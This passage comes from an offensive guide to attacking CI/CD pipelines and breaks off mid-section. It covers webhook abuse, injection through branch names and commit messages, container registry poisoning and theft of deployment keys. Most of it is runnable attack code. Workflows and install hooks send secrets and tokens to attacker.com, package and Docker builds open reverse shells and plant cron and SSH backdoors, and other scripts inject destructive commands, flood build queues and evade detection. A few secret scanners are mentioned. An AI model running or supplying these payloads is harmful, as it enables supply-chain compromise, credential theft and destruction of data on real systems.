**Jenkins Webhook Exploitation**

```bash
# Generic webhook trigger plugin exploitation
# If no authentication token required

# Trigger build
curl http://jenkins.company.com/generic-webhook-trigger/invoke

# With parameters
curl "http://jenkins.company.com/generic-webhook-trigger/invoke?token=&branch=main;whoami"

# If token is weak
curl "http://jenkins.company.com/generic-webhook-trigger/invoke?token=build&branch=$(curl+attacker.com)"
```

**GitHub Actions Webhook Exploitation**

```yaml
# Malicious workflow triggered by webhook
name: Exploit Webhook
on:
  repository_dispatch:
    types: [custom-event]

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Execute payload
        run: |
          echo "${{ github.event.client_payload.command }}" | bash
```

```bash
# Trigger malicious workflow via repository_dispatch webhook
curl -X POST \
  -H "Authorization: token $GITHUB_TOKEN" \
  -H "Accept: application/vnd.github.v3+json" \
  https://api.github.com/repos/<owner>/<repo>/dispatches \
  -d '{"event_type":"custom-event","client_payload":{"command":"curl attacker.com/shell.sh | bash"}}'
```

**GitLab Webhook Exploitation**

```bash
# Trigger pipeline with malicious variables
curl -X POST \
  --header "X-Gitlab-Token: <token>" \
  https://gitlab.com/api/v4/projects/<id>/trigger/pipeline \
  -F "ref=main" \
  -F "variables[DEPLOY_ENV]=production; rm -rf /"

# [Inference] If pipeline uses variables unsafely in scripts
```

**CircleCI Webhook Exploitation**

```bash
# Trigger workflow via API
curl -X POST \
  --header "Circle-Token: <token>" \
  --header "Content-Type: application/json" \
  -d '{
    "branch": "main",
    "parameters": {
      "run_exploit": true,
      "payload": "curl attacker.com | bash"
    }
  }' \
  https://circleci.com/api/v2/project/gh/<org>/<repo>/pipeline
```

### Webhook DoS Attacks

**Build Queue Flooding**

```bash
# Flood CI/CD with webhook triggers
for i in {1..1000}; do
    curl -X POST http://ci-server.com/webhook \
      -H "Content-Type: application/json" \
      -d '{"ref":"main","force_build":true}' &
done

# [Inference] Can exhaust:
# - Build agent resources
# - Queue capacity
# - Storage for logs/artifacts
```

**Resource-Intensive Build Triggers**

```bash
# Trigger builds designed to consume maximum resources
curl -X POST http://ci-server.com/webhook \
  -d '{"ref":"expensive-build-branch"}'

# Branch contains resource-intensive tasks:
# - Large file compilations
# - Extensive test suites
# - Heavy Docker image builds
```

**Webhook Loop Creation**

```bash
# Create circular webhook triggers

# Service A triggers Service B
# Service B triggers Service A
# [Inference] Creates infinite loop consuming resources

# Example: Git push triggers build, build pushes to repo, which triggers another build
```

### Webhook Parameter Smuggling

**JSON Parameter Injection**

```bash
# Exploit JSON parsing differences
curl -X POST http://ci-server.com/webhook \
  -H "Content-Type: application/json" \
  -d '{
    "branch": "main",
    "branch": "malicious",
    "repository": "target"
  }'

# [Inference] Different parsers may use different "branch" values
```

**Header Injection**

```bash
# Inject malicious headers via webhook
curl -X POST http://ci-server.com/webhook \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Original-URL: /admin/execute" \
  -d '{"ref":"main"}'

# [Inference] May bypass IP-based restrictions or alter routing
```

**Content-Type Confusion**

```bash
# Send JSON as form data
curl -X POST http://ci-server.com/webhook \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'payload={"ref":"main$(whoami)"}'

# [Inference] May bypass JSON-specific validation
```

### Webhook Authentication Bypass

**Missing Signature Validation**

```bash
# Many webhooks don't validate signatures properly
# Send webhook without signature header

curl -X POST http://ci-server.com/webhook \
  -H "Content-Type: application/json" \
  -d '{"ref":"main","unauthorized":true}'

# [Inference] If server doesn't enforce signature presence
```

**IP Whitelist Bypass**

```bash
# If webhook validates source IP
# Use X-Forwarded-For spoofing

curl -X POST http://ci-server.com/webhook \
  -H "X-Forwarded-For: 192.30.252.0" \
  -H "Content-Type: application/json" \
  -d '{"ref":"main"}'

# GitHub's webhook IPs (example)
# [Inference] Some servers trust X-Forwarded-For without validation
```

**OAuth Token Theft via Webhook**

```bash
# If webhook URL can be controlled
# Set webhook to attacker server to capture OAuth tokens

# Configure malicious webhook URL
curl -X POST https://api.github.com/repos/<owner>/<repo>/hooks \
  -H "Authorization: token <token>" \
  -d '{
    "config": {
      "url": "https://attacker.com/capture",
      "content_type": "json"
    },
    "events": ["push"]
  }'

# Attacker server logs incoming requests with tokens
```

### Webhook Data Exfiltration

**Sensitive Data in Webhook Payloads**

```python
# Set up server to capture webhook data
from flask import Flask, request
import json

app = Flask(__name__)

@app.route('/webhook', methods=['POST'])
def capture():
    data = request.get_json()
    
    # Log all webhook data
    with open('captured_webhooks.log', 'a') as f:
        f.write(json.dumps(data, indent=2) + '\n')
    
    # Extract sensitive information
    if 'environment' in data:
        print(f"[!] Environment vars: {data['environment']}")
    
    if 'secrets' in data:
        print(f"[!] Secrets found: {data['secrets']}")
    
    return '', 200

app.run(host='0.0.0.0', port=8080)
```

**Build Status Webhooks**

```bash
# Many CI/CD systems send build status via webhook
# These may contain:
# - Commit messages with sensitive info
# - Environment details
# - Artifact URLs
# - Error messages with stack traces

# Configure callback webhook to capture this data
curl -X POST http://jenkins.company.com/job/myproject/config.xml \
  --data-urlencode config@- <<EOF
<project>
  <properties>
    <hudson.plugins.postbuildtask.PostbuildTask>
      <tasks>
        <hudson.plugins.postbuildtask.TaskProperties>
          <script>curl -X POST https://attacker.com/exfil -d @build.log</script>
        </hudson.plugins.postbuildtask.TaskProperties>
      </tasks>
    </hudson.plugins.postbuildtask.PostbuildTask>
  </properties>
</project>
EOF
```

### Webhook Persistence

**Persistent Webhook Installation**

```bash
# Install webhook that survives configuration changes

# GitHub - create webhook with admin token
curl -X POST https://api.github.com/repos/<owner>/<repo>/hooks \
  -H "Authorization: token <admin_token>" \
  -d '{
    "name": "web",
    "active": true,
    "events": ["push", "pull_request", "release"],
    "config": {
      "url": "https://attacker.com/persistent-webhook",
      "content_type": "json",
      "insecure_ssl": "1"
    }
  }'

# [Inference] Remains active until explicitly removed
```

**Hidden Webhook Registration**

```bash
# Register webhook with innocuous-looking name
curl -X POST https://gitlab.com/api/v4/projects/<id>/hooks \
  --header "PRIVATE-TOKEN: <token>" \
  -d "url=https://attacker.com/hook" \
  -d "push_events=true" \
  -d "note=Monitoring webhook for analytics"

# Blends in with legitimate monitoring webhooks
```

### Webhook Monitoring and Detection Evasion

**Randomized Timing**

```python
# Avoid detection by varying webhook trigger timing
import time
import random
import requests

webhook_url = "http://ci-server.com/webhook"
payload = {"ref": "main", "malicious": True}

while True:
    # Random delay between 1-24 hours
    delay = random.randint(3600, 86400)
    time.sleep(delay)
    
    try:
        requests.post(webhook_url, json=payload)
    except:
        pass
```

**Low-and-Slow Exploitation**

```bash
# Trigger malicious builds infrequently
# Once per week at random times

# Cron job on attacker-controlled server
# 0 */168 * * * curl -X POST http://ci-server.com/webhook -d '{"ref":"backdoor-branch"}'

# [Inference] Harder to detect than frequent malicious activity
```

### Webhook Fuzzing

**Automated Webhook Fuzzing**

```python
import requests
import json

webhook_url = "http://ci-server.com/webhook"

# Fuzz payloads
payloads = [
    {"ref": "main"},
    {"ref": "main; whoami"},
    {"ref": "main$(id)"},
    {"ref": "main`curl attacker.com`"},
    {"ref": "main\nmalicious\ncommand"},
    {"ref": "main' OR '1'='1"},
    {"ref": "../../../etc/passwd"},
    {"ref": "main\x00truncate"},
    {"ref": "A"*10000},  # Buffer overflow attempt
    {"repository": {"url": "http://169.254.169.254/"}},  # SSRF
]

for payload in payloads:
    try:
        response = requests.post(webhook_url, json=payload, timeout=5)
        print(f"Payload: {payload}")
        print(f"Status: {response.status_code}")
        print(f"Response: {response.text[:200]}\n")
    except Exception as e:
        print(f"Error with {payload}: {e}\n")
```

**Header Fuzzing**

```bash
# Test various authentication bypass techniques
for header in "X-Forwarded-For" "X-Real-IP" "X-Original-URL" "X-Rewrite-URL"; do
    curl -X POST http://ci-server.com/webhook \
      -H "$header: 127.0.0.1" \
      -H "Content-Type: application/json" \
      -d '{"ref":"main"}' -v
done
```

### Webhook Security Best Practices (Defense Perspective)

**[Inference] Understanding defenses helps identify bypass opportunities:**

1. **Signature Validation**
    
    - Look for weak secrets
    - Test signature validation bypass
    - Check for timing attack vulnerabilities
2. **IP Whitelisting**
    
    - Test X-Forwarded-For spoofing
    - Look for proxy misconfigurations
    - Check for IPv6 bypass
3. **Input Validation**
    
    - Test all payload fields
    - Check for type confusion
    - Test encoding/escaping bypasses
4. **Rate Limiting**
    
    - Test distributed attacks
    - Check for per-IP vs per-endpoint limits
    - Test rate limit reset timing
5. **Authentication**
    
    - Test token/secret brute force
    - Check for authentication bypass
    - Test for privilege escalation

---

## Related Topics and Subtopics

**Important related areas to explore:**

1. **Container Security** - Deep dive into container escape techniques, image scanning bypass, and runtime protection evasion
    
2. **Kubernetes Security** - RBAC exploitation, pod escape, secrets extraction from K8s clusters targeted by CI/CD
    
3. **Infrastructure as Code (IaC) Security** - Terraform/CloudFormation manipulation, state file poisoning, provider credential theft
    
4. **Source Code Management (SCM) Security** - Git exploitation, branch protection bypass, commit signing bypass
    
5. **Artifact Repository Security** - Repository manager exploitation (Nexus, Artifactory), package/dependency confusion attacks
    
6. **Cloud Provider Security** - AWS/GCP/Azure credential theft specific to CI/CD contexts, metadata service exploitation, role assumption attacks

---

## Pipeline Injection

Pipeline injection occurs when attackers manipulate CI/CD configuration files, build scripts, or input data to execute arbitrary commands within the pipeline environment.

### Attack Vectors and Methodology

**Configuration File Manipulation:**

CI/CD pipelines typically use configuration files that define build steps:

```yaml
# Common CI/CD configuration files
.gitlab-ci.yml          # GitLab CI/CD
.github/workflows/*.yml # GitHub Actions
Jenkinsfile            # Jenkins
.travis.yml            # Travis CI
azure-pipelines.yml    # Azure DevOps
bitbucket-pipelines.yml # Bitbucket Pipelines
.circleci/config.yml   # CircleCI
```

**Direct Repository Access Attack:**

```bash
# If you have write access to repository (compromised developer account)
git clone https://github.com/target/repo.git
cd repo

# Modify pipeline configuration to inject commands
cat >> .gitlab-ci.yml << 'EOF'

malicious_job:
  stage: deploy
  script:
    - curl http://attacker.com/$(whoami)
    - env | base64 | curl -X POST -d @- http://attacker.com/exfil
    - cat /var/run/secrets/kubernetes.io/serviceaccount/token | curl -X POST -d @- http://attacker.com/k8s-token
  only:
    - main
EOF

git add .gitlab-ci.yml
git commit -m "Update deployment configuration"
git push origin main
```

**GitHub Actions Injection Example:**

```yaml
# .github/workflows/ci.yml - Vulnerable workflow
name: CI Pipeline
on: [push, pull_request]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Run tests
        run: echo "Testing branch ${{ github.head_ref }}"
```

**Exploitation via Branch Name Injection:**

```bash
# Create malicious branch name with command injection
git checkout -b 'main; curl http://attacker.com/$(cat /etc/passwd | base64); echo'
git push origin 'main; curl http://attacker.com/$(cat /etc/passwd | base64); echo'

# When workflow executes:
# echo "Testing branch main; curl http://attacker.com/$(cat /etc/passwd | base64); echo"
# The injected commands execute in the runner context
```

**Environment Variable Injection:**

```yaml
# Vulnerable workflow using user-controlled input
- name: Deploy
  run: |
    echo "Deploying version: ${{ github.event.head_commit.message }}"
    ./deploy.sh "${{ github.event.head_commit.message }}"
```

**Exploitation:**

```bash
# Craft malicious commit message
git commit -m "v1.0.0\"; curl http://attacker.com/\$(env|base64); echo \""
git push

# Executed command becomes:
# ./deploy.sh "v1.0.0"; curl http://attacker.com/$(env|base64); echo ""
```

### Pull Request Poisoning

**Attack Flow:**

1. Fork target repository
2. Modify workflow files or scripts called by workflows
3. Submit pull request
4. Wait for CI/CD to execute on pull request branch

**Example Malicious Workflow Addition:**

```yaml
# Added to .github/workflows/pr-check.yml
name: PR Validation
on: pull_request

jobs:
  exfiltrate:
    runs-on: ubuntu-latest
    steps:
      - name: Extract secrets
        run: |
          echo "${{ toJSON(secrets) }}" | base64 | curl -X POST -d @- http://attacker.com/secrets
          echo "${{ toJSON(vars) }}" | base64 | curl -X POST -d @- http://attacker.com/vars
          env | grep -i 'token\|key\|secret\|password' | base64 | curl -X POST -d @- http://attacker.com/env
```

[Unverified] Some CI/CD platforms may restrict workflow modifications in pull requests from forks, but configuration varies by platform and repository settings.

### Script Injection via Dependencies

**Package Manager Hook Exploitation:**

```json
// package.json - Node.js example
{
  "name": "legitimate-package",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "curl http://attacker.com/$(whoami) && curl http://attacker.com/$(env|base64)",
    "postinstall": "node -e \"require('child_process').exec('bash -i >& /dev/tcp/attacker.com/4444 0>&1')\""
  }
}
```

**Python Setup Hook:**

```python
# setup.py
import os
import subprocess
from setuptools import setup
from setuptools.command.install import install

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        # Malicious payload
        subprocess.call(['curl', 'http://attacker.com/$(env|base64)'], shell=True)
        os.system('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"')

setup(
    name='legitimate-package',
    version='1.0.0',
    cmdclass={'install': PostInstallCommand}
)
```

### Jenkins Pipeline Injection

**Groovy Script Injection:**

```groovy
// Jenkinsfile
pipeline {
    agent any
    parameters {
        string(name: 'VERSION', defaultValue: '1.0', description: 'Version to deploy')
    }
    stages {
        stage('Deploy') {
            steps {
                // VULNERABLE: Unsanitized parameter usage
                sh "echo Deploying version: ${params.VERSION}"
            }
        }
    }
}
```

**Exploitation:**

```bash
# Trigger build with malicious parameter via API
curl -X POST "https://jenkins.target.com/job/deploy/buildWithParameters" \
  --user "username:api-token" \
  --data-urlencode "VERSION=1.0; curl http://attacker.com/\$(cat /var/jenkins_home/secrets/master.key | base64)"

# Or through UI: Set VERSION parameter to:
1.0; wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh
```

**Shared Library Poisoning:**

```groovy
// vars/deployLib.groovy in shared library repository
def call(Map config) {
    // Malicious code in shared library
    sh """
        curl http://attacker.com/jenkins-secrets -d "\$(cat /var/jenkins_home/credentials.xml | base64)"
        ${config.deployCommand}
    """
}
```

### GitLab CI/CD Injection Techniques

**Variable Expansion Exploitation:**

```yaml
# .gitlab-ci.yml
variables:
  DOCKER_IMAGE: "registry.example.com/app"

deploy:
  script:
    - echo "Deploying $DOCKER_IMAGE:$CI_COMMIT_REF_NAME"
    - docker pull $DOCKER_IMAGE:$CI_COMMIT_REF_NAME
    - docker run $DOCKER_IMAGE:$CI_COMMIT_REF_NAME
```

**Exploitation via Branch/Tag Names:**

```bash
# Create malicious tag
git tag -a "latest; curl http://attacker.com/\$(env|base64); echo" -m "Release"
git push origin "latest; curl http://attacker.com/\$(env|base64); echo"

# Executed command becomes:
# docker pull registry.example.com/app:latest; curl http://attacker.com/$(env|base64); echo
```

**Runner Token Extraction:**

```yaml
# Add to .gitlab-ci.yml
exfiltrate:
  script:
    - cat /etc/gitlab-runner/config.toml
    - curl -X POST http://attacker.com/runner-config -d @/etc/gitlab-runner/config.toml
    - echo $CI_JOB_TOKEN | base64 | curl -X POST -d @- http://attacker.com/job-token
```

### Tools for Pipeline Injection

**Gitleaks - Secret Detection:**

```bash
# Install
wget https://github.com/gitleaks/gitleaks/releases/download/v8.18.0/gitleaks_8.18.0_linux_x64.tar.gz
tar -xzf gitleaks_8.18.0_linux_x64.tar.gz
sudo mv gitleaks /usr/local/bin/

# Scan repository for secrets in pipeline files
gitleaks detect --source /path/to/repo --verbose

# Scan specific file
gitleaks detect --source .gitlab-ci.yml --no-git

# Output to JSON for parsing
gitleaks detect --source /path/to/repo --report-format json --report-path results.json
```

**TruffleHog - Deep History Scanning:**

```bash
# Install
pip3 install truffleHog

# Scan entire Git history
trufflehog git https://github.com/target/repo.git --json > findings.json

# Scan specific branch
trufflehog git https://github.com/target/repo.git --branch dev

# Focus on high entropy strings (keys, tokens)
trufflehog git https://github.com/target/repo.git --regex --entropy=True
```

**Custom Pipeline Injection Scanner:**

```bash
#!/bin/bash
# ci-injection-scanner.sh

REPO_PATH=$1

echo "[*] Scanning for CI/CD injection vulnerabilities in: $REPO_PATH"

# Find all CI/CD configuration files
CI_FILES=$(find "$REPO_PATH" -type f \( \
  -name ".gitlab-ci.yml" -o \
  -name "Jenkinsfile" -o \
  -name ".travis.yml" -o \
  -name "azure-pipelines.yml" -o \
  -name "bitbucket-pipelines.yml" -o \
  -path "*/.github/workflows/*.yml" -o \
  -path "*/.circleci/config.yml" \))

echo "[*] Found CI/CD files:"
echo "$CI_FILES"

# Check for dangerous patterns
echo -e "\n[*] Checking for injection vulnerabilities..."

for file in $CI_FILES; do
  echo -e "\n[+] Analyzing: $file"
  
  # Check for unquoted variable expansion
  grep -n '\${{' "$file" | grep -v '"' && echo "    [!] Unquoted variable expansion found"
  
  # Check for eval usage
  grep -n 'eval' "$file" && echo "    [!] eval usage detected"
  
  # Check for script blocks with variables
  grep -n 'script:' "$file" -A 5 | grep '\$' && echo "    [!] Variable in script block"
  
  # Check for pull_request triggers
  grep -n 'pull_request' "$file" && echo "    [INFO] PR trigger found - check if secrets exposed"
  
  # Check for hardcoded credentials
  grep -ni 'password\|secret\|token\|key' "$file" | grep -v '\${{' && echo "    [!] Potential hardcoded secret"
done

echo -e "\n[*] Scan complete"
```

**Usage:**

```bash
chmod +x ci-injection-scanner.sh
./ci-injection-scanner.sh /path/to/target-repo
```

## Container Registry Poisoning

Container registry poisoning involves compromising container images stored in registries (Docker Hub, AWS ECR, Azure ACR, Google GCR, GitLab Registry) to inject malicious code into the software supply chain.

### Attack Methodology

**Registry Credential Compromise:**

```bash
# Common locations for registry credentials
~/.docker/config.json           # Docker CLI credentials
/var/run/docker.sock            # Docker daemon socket
~/.aws/credentials              # AWS ECR credentials
~/. azure/credentials           # Azure ACR credentials
~/.config/gcloud/               # GCP GCR credentials

# Extract Docker credentials
cat ~/.docker/config.json
cat ~/.docker/config.json | jq -r '.auths'

# Decode base64 auth tokens
cat ~/.docker/config.json | jq -r '.auths["registry.example.com"].auth' | base64 -d
```

**Docker Hub Authentication:**

```bash
# Found credentials in CI/CD environment variables
export DOCKER_USERNAME="compromised-user"
export DOCKER_PASSWORD="compromised-pass"

# Login to Docker Hub
echo "$DOCKER_PASSWORD" | docker login -u "$DOCKER_USERNAME" --password-stdin

# List accessible repositories
docker search $DOCKER_USERNAME

# Pull legitimate image
docker pull company/production-app:latest
```

**Image Manipulation and Reupload:**

```bash
# Pull target image
docker pull company/production-app:latest

# Create malicious Dockerfile based on target
cat > Dockerfile.malicious << 'EOF'
FROM company/production-app:latest

# Add backdoor user
RUN useradd -m -s /bin/bash backdoor && \
    echo 'backdoor:P@ssw0rd123' | chpasswd && \
    usermod -aG sudo backdoor

# Install reverse shell
RUN echo '#!/bin/bash\nbash -i >& /dev/tcp/attacker.com/4444 0>&1' > /usr/local/bin/reverse-shell && \
    chmod +x /usr/local/bin/reverse-shell

# Add cron job for persistence
RUN echo '*/5 * * * * /usr/local/bin/reverse-shell' | crontab -

# Add SSH backdoor
RUN mkdir -p /root/.ssh && \
    echo 'ssh-rsa AAAAB3NzaC1yc2E... attacker@evil.com' >> /root/.ssh/authorized_keys && \
    chmod 600 /root/.ssh/authorized_keys

# Modify entrypoint to execute backdoor first
RUN mv /entrypoint.sh /entrypoint.original.sh
COPY entrypoint-wrapper.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

ENTRYPOINT ["/entrypoint.sh"]
EOF

# Create entrypoint wrapper
cat > entrypoint-wrapper.sh << 'EOF'
#!/bin/bash
# Execute backdoor in background
nohup /usr/local/bin/reverse-shell &
# Execute original entrypoint
exec /entrypoint.original.sh "$@"
EOF

# Build poisoned image
docker build -f Dockerfile.malicious -t company/production-app:latest .

# Push poisoned image (overwrites legitimate image)
docker push company/production-app:latest
```

**Tag Manipulation:**

```bash
# Pull specific version
docker pull company/app:v1.2.3

# Create poisoned version
docker build -t company/app:v1.2.3 -f Dockerfile.malicious .

# Push with same tag (if registry allows overwrites)
docker push company/app:v1.2.3

# Also push to commonly used tags
docker tag company/app:v1.2.3 company/app:latest
docker push company/app:latest

docker tag company/app:v1.2.3 company/app:stable
docker push company/app:stable

docker tag company/app:v1.2.3 company/app:production
docker push company/app:production
```

### Registry-Specific Exploitation

**AWS ECR Poisoning:**

```bash
# Authenticate to ECR (if credentials compromised)
aws ecr get-login-password --region us-east-1 | \
  docker login --username AWS --password-stdin 123456789012.dkr.ecr.us-east-1.amazonaws.com

# List repositories
aws ecr describe-repositories --region us-east-1

# List images in repository
aws ecr list-images --repository-name production-app --region us-east-1

# Pull target image
docker pull 123456789012.dkr.ecr.us-east-1.amazonaws.com/production-app:latest

# Create and push poisoned image
docker build -t 123456789012.dkr.ecr.us-east-1.amazonaws.com/production-app:latest .
docker push 123456789012.dkr.ecr.us-east-1.amazonaws.com/production-app:latest

# If you have ECR permissions, modify repository policy for persistence
aws ecr set-repository-policy \
  --repository-name production-app \
  --policy-text file://malicious-policy.json
```

**Malicious ECR Policy Example:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowAttackerAccount",
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::ATTACKER-ACCOUNT-ID:root"
      },
      "Action": [
        "ecr:BatchGetImage",
        "ecr:GetDownloadUrlForLayer",
        "ecr:PutImage"
      ]
    }
  ]
}
```

**Azure Container Registry (ACR) Poisoning:**

```bash
# Login to ACR
az acr login --name targetregistry

# Or with service principal credentials
docker login targetregistry.azurecr.io \
  --username $SP_APP_ID \
  --password $SP_PASSWORD

# List repositories
az acr repository list --name targetregistry --output table

# List tags
az acr repository show-tags --name targetregistry --repository production-app

# Pull and poison
docker pull targetregistry.azurecr.io/production-app:latest
docker build -t targetregistry.azurecr.io/production-app:latest .
docker push targetregistry.azurecr.io/production-app:latest
```

**Google Container Registry (GCR) Poisoning:**

```bash
# Authenticate to GCR
gcloud auth configure-docker

# Or use service account key
cat service-account-key.json | docker login -u _json_key --password-stdin https://gcr.io

# List images
gcloud container images list --repository=gcr.io/project-id

# List tags
gcloud container images list-tags gcr.io/project-id/production-app

# Pull, poison, and push
docker pull gcr.io/project-id/production-app:latest
docker build -t gcr.io/project-id/production-app:latest .
docker push gcr.io/project-id/production-app:latest
```

### Layer-Based Poisoning

**Inspect Image Layers:**

```bash
# View image history
docker history company/app:latest

# Extract image filesystem
docker save company/app:latest -o app-image.tar
tar -xf app-image.tar

# Examine layer contents
ls -la */layer.tar
tar -tf */layer.tar | grep -i 'passwd\|shadow\|key\|credential'

# Extract specific layer
tar -xf <layer-hash>/layer.tar
```

**Inject Malicious Layer:**

```dockerfile
# Create minimal malicious layer
FROM company/app:latest

# Single layer with backdoor
RUN echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' > /tmp/.backdoor && \
    chmod +x /tmp/.backdoor && \
    echo '@reboot /tmp/.backdoor' | crontab -
```

This approach creates a smaller forensic footprint compared to extensive modifications.

### Tools for Registry Exploitation

**Docker-Registry-Client:**

```bash
# Install
git clone https://github.com/andrey-pohilko/registry-cli
cd registry-cli

# List repositories (anonymous or authenticated)
./registry.py -r https://registry.example.com -l admin:password list

# Get image tags
./registry.py -r https://registry.example.com -l admin:password list-tags company/app

# Delete tag (if permissions allow)
./registry.py -r https://registry.example.com -l admin:password delete-tag company/app:latest

# Delete entire image
./registry.py -r https://registry.example.com -l admin:password delete company/app
```

**Dive - Image Layer Analysis:**

```bash
# Install
wget https://github.com/wagoodman/dive/releases/download/v0.11.0/dive_0.11.0_linux_amd64.deb
sudo dpkg -i dive_0.11.0_linux_amd64.deb

# Analyze image interactively
dive company/app:latest

# Show layer contents and changes
# Navigate with arrow keys, Tab to switch panes
# Look for added files, modified binaries, suspicious scripts
```

**Trivy - Vulnerability and Secret Scanning:**

```bash
# Install
wget https://github.com/aquasecurity/trivy/releases/download/v0.48.0/trivy_0.48.0_Linux-64bit.deb
sudo dpkg -i trivy_0.48.0_Linux-64bit.deb

# Scan image for vulnerabilities
trivy image company/app:latest

# Scan for secrets in image
trivy image --scanners secret company/app:latest

# Scan for misconfigurations
trivy image --scanners config company/app:latest

# Output in JSON for parsing
trivy image -f json -o results.json company/app:latest
```

**Registry Dumper Script:**

```bash
#!/bin/bash
# registry-dumper.sh - Extract all images from registry

REGISTRY=$1
USERNAME=$2
PASSWORD=$3
OUTPUT_DIR="registry_dump_$(date +%Y%m%d_%H%M%S)"

mkdir -p "$OUTPUT_DIR"

echo "[*] Authenticating to registry: $REGISTRY"
echo "$PASSWORD" | docker login "$REGISTRY" -u "$USERNAME" --password-stdin

# This script structure requires registry API v2
# List all repositories
REPOS=$(curl -s -u "$USERNAME:$PASSWORD" "https://$REGISTRY/v2/_catalog" | jq -r '.repositories[]')

echo "[*] Found repositories:"
echo "$REPOS"

for repo in $REPOS; do
  echo "[+] Processing repository: $repo"
  
  # Get tags for repository
  TAGS=$(curl -s -u "$USERNAME:$PASSWORD" "https://$REGISTRY/v2/$repo/tags/list" | jq -r '.tags[]')
  
  for tag in $TAGS; do
    IMAGE="$REGISTRY/$repo:$tag"
    echo "    [+] Pulling: $IMAGE"
    
    docker pull "$IMAGE"
    docker save "$IMAGE" -o "$OUTPUT_DIR/${repo//\//_}_${tag}.tar"
    
    echo "    [✓] Saved to: $OUTPUT_DIR/${repo//\//_}_${tag}.tar"
  done
done

echo "[*] Registry dump complete. Output: $OUTPUT_DIR"
```

**Usage:**

```bash
chmod +x registry-dumper.sh
./registry-dumper.sh registry.example.com admin password123
```

### Supply Chain Attack via Base Images

**Poisoning Common Base Images:**

If you gain access to accounts that publish popular base images:

```bash
# Example: Compromised account publishing widely-used base image
docker login -u compromised-publisher

# Pull official base image
docker pull node:18-alpine

# Create Dockerfile with backdoor
cat > Dockerfile << 'EOF'
FROM node:18-alpine

# Subtle backdoor in commonly used base image
RUN echo '#!/bin/sh' > /usr/local/bin/npm-install-backdoor && \
    echo 'if [ -f package.json ]; then' >> /usr/local/bin/npm-install-backdoor && \
    echo '  curl -s http://attacker.com/collect -d "$(pwd):$(cat package.json | base64)"' >> /usr/local/bin/npm-install-backdoor && \
    echo 'fi' >> /usr/local/bin/npm-install-backdoor && \
    echo 'exec /usr/local/bin/npm.original "$@"' >> /usr/local/bin/npm-install-backdoor && \
    chmod +x /usr/local/bin/npm-install-backdoor && \
    mv /usr/local/bin/npm /usr/local/bin/npm.original && \
    mv /usr/local/bin/npm-install-backdoor /usr/local/bin/npm
EOF

# Build and push as legitimate-looking variant
docker build -t compromised-publisher/node:18-alpine-slim .
docker push compromised-publisher/node:18-alpine-slim

# Downstream users who use FROM compromised-publisher/node:18-alpine-slim
# will unknowingly include the backdoor in their builds
```

## Deployment Key Exposure

Deployment keys (SSH keys, API tokens, service account credentials) grant CI/CD pipelines access to production infrastructure. Their exposure enables direct production compromise.

### Common Exposure Locations

**CI/CD Environment Variables:**

```bash
# GitLab CI/CD variable extraction
# If you have pipeline access, add job to .gitlab-ci.yml:

exfiltrate_secrets:
  script:
    - env
    - env | base64 | curl -X POST -d @- http://attacker.com/gitlab-secrets
  only:
    - main
```

**GitHub Actions Secrets Extraction:**

```yaml
# .github/workflows/exfil-secrets.yml
name: Extract Secrets
on: [push]

jobs:
  exfiltrate:
    runs-on: ubuntu-latest
    steps:
      - name: Dump all secrets
        env:
          ALL_SECRETS: ${{ toJSON(secrets) }}
        run: |
          echo "$ALL_SECRETS" | base64 | curl -X POST -d @- http://attacker.com/gh-secrets
          
      - name: Dump specific secrets
        run: |
          echo "${{ secrets.AWS_ACCESS_KEY_ID }}" | curl -X POST -d @- http://attacker.com/aws-key
          echo "${{ secrets.AWS_SECRET_ACCESS_KEY }}" | curl -X POST -d @- http://attacker.com/aws-secret
          echo "${{ secrets.DEPLOY_SSH_KEY }}" | curl -X POST -d @- http://attacker.com/ssh-key
```

**Jenkins Credentials:**

```bash
# If you have access to Jenkins master filesystem
# Credentials stored in:
/var/jenkins_home/credentials.xml
/var/jenkins_home/secrets/master.key
/var/jenkins_home/secrets/hudson.util.Secret

# Extract credentials using Jenkins Script Console (Manage Jenkins > Script Console)
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,
    Jenkins.instance,
    null,
    null
)

for (c in creds) {
    println("ID: " + c.id)
    println("Username: " + c.username)
    println("Password: " + c.password)
    println("Description: " + c.description)
    println("---")
}
```

**SSH Key Extraction:**

```bash
# Common SSH key locations in CI/CD runners
~/.ssh/id_rsa
~/.ssh/id_ed25519
~/.ssh/deploy_key
/root/.ssh/id_rsa
/home/gitlab-runner/.ssh/id_rsa
/home/jenkins/.ssh/id_rsa

# Extract via pipeline job
cat ~/.ssh/id_rsa | base64 | curl -X POST -d @- http://attacker.com/ssh-key
cat ~/.ssh/config | base64 | curl -X POST -d @- http://attacker.com/ssh-config
cat ~/.ssh/known_hosts | base64 | curl -X POST -d @- http://attacker.com/known-hosts
```

### Kubernetes Service Account Token Extraction

```bash
# In containerized CI/CD runners (Kubernetes pods)
# Service account tokens automatically mounted at:
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
/var/run/secrets/kubernetes.io/serviceaccount/namespace

# Extract token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Test token permissions
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/pods

# Exfiltrate token
echo "$TOKEN" | base64 | curl -X POST -d @- http://attacker.com/k8s-token

# Use token externally
kubectl --token="$TOKEN" \
  --server=https://k8s-cluster.example.com \
  --certificate-authority=/path/to/ca.crt \
  get pods -n $NAMESPACE
```

### Cloud Provider Credential Extraction

**AWS Credentials:**

```bash
